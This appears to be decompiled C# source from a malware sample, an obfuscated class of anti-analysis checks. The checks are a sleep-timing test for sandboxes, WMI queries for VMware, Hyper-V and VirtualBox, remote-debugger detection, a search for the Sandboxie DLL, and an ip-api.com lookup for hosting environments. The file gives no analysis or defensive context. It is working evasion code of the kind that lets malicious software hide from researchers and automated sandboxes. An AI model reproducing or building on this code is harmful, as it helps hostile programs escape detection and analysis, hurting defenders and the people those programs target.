using System;
using System.Diagnostics;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class8
{
	public static bool smethod_0()
	{
		try
		{
			long ticks = DateTime.Now.Ticks;
			Thread.Sleep(10);
			if (checked(DateTime.Now.Ticks - ticks) < 10)
			{
				return true;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public static bool smethod_1()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
				try
				{
					enumerator = val2.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						string text = current.get_Item("Manufacturer").ToString()!.ToLower();
						if ((Operators.CompareString(text, "microsoft corporation", false) == 0 && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || Operators.CompareString(current.get_Item("Model").ToString(), "VirtualBox", false) == 0)
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		return false;
	}

	public static bool smethod_2()
	{
		bool bool_ = false;
		CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref bool_);
		return bool_;
	}

	public static bool smethod_3()
	{
		if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
		{
			return true;
		}
		return false;
	}

	public static bool smethod_4()
	{
		try
		{
			string text = new WebClient().DownloadString("http://ip-api.com/line/?fields=hosting");
			return text.Contains("true");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_0);
}
